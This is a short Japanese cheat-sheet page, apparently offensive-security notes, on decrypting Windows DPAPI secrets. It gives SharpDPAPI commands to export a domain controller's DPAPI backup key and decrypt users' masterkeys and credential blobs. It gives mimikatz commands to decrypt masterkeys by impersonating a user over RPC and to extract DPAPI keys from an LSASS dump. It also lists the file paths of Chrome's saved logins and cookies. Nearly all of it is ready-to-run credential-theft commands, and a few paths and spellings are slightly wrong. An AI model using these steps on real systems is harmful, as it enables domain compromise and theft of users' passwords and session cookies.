---
title: DPAPI
category: windows
weight: -1
---

## DPAPI 

```
# masterkey
C:\Users\test\AppData\Roaming\Microsoft\Protect
# blob
C:\Users\test\AppData\Local\Microsoft\Credential
```

masterkeyでblobを復号するけど、masterkeyも暗号化されている。
DCに保存されているbackupkeyでmasterkeyを復号可能。


### backupkeyを使った復号 by SharpDPAPI

1. DA権限で、任意の端末から実行
    ```cmd
    SharpDPAPI.exe backupkey /server:primary.testlab.local /file:key.pvk
    ```

2. blobを指定して使用されているmastekeyを特定する。
    ```cmd
    SharpDPAPI.exe credentials /target:0B20591F2E66B04317609D770D91466D
    ```

3. backupkeyを用いてmasterkeyを復号する。
    ```cmd
    SharpDPAPI.exe masterkeys /pvk:key.pvk /target: C:\Users\test\AppData\Roaming\Microsoft\Protect\S-1-5-21-1960477253-2559852060-3892384560-1001\410dad28-58bc-4320-babd-2ee0e7a2f7d
    ```

4. 復号したmasterkeyを使ってblobを復号する。
    ```cmd
    SharpDPAPI.exe credentials /target:0B20591F2E66B04317609D770D91466D {934a40a4-947d-45c1-9cd9-1d235f652812}:D538DF23CD435B07DCBF293CB22915C487F8F797
    ```

---

### backupkeyを使わない方法 by Mimikatz
ユーザになりすましてmasterkeyを復号する方法。

1. blobを指定して使用されているmastekeyを特定する。
    ```cmd
    mimikatz # dpapi::blob /in:"<blob path>"
    ```
2. 127.0.0.1:445をDCにポートフォワード設定し、復号されたmasterkeyを取り出す。(この時多分、pass the hash等で指定したユーザに成り済ます必要がある)
    ```cmd
    mimikatz # dpapi::masterkey /in:"<masterkey path>" /protected /sid:"<target users SID>" /rpc /dc:127.0.0.1
    ``` 
3.  復号されたmasterkeyを使って、blobを復号する。
    ```cmd
    mimikatz # dpapi::blob /in:"<blob path>" /masterkey:"<decrypted master key>"
    ```

---

### ScheduledTask
Scheduled Taskの認証情報はDPAPIを使って保存されてる。
masterkeyはLSASSの中にあるので、それを取って使う。

```
mimikatz # privilege::debug
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::dpapi
```

```
C:\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
```

---

### Browser

```
# Chrome
C:\Users\[username]\AppData\Local\Google\Chrome\User Data\Local State
C:\Users\[username]\AppData\Local\Google\Chrome\User Data\Profile\Login Data
C:\Users\[username]\AppData\Local\Google\Chrome\User Data\Profile\Network\Cookies
```

